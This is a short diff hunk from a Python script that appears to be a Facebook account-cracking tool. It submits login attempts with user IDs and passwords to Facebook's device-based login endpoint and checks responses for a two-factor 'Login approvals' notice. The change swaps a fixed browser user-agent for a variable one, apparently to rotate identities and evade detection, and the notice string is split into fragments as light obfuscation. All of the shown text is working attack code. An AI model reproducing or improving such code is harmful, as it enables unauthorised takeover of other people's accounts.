@@ -1800,7 +1800,7 @@ def d(uid,pwx,tl):
 'sec-fetch-site': 'same-origin',
 'sec-fetch-user': '?1',
 'upgrade-insecure-requests': '1',
-'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
+'user-agent': ua,
 'viewport-width': '511'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
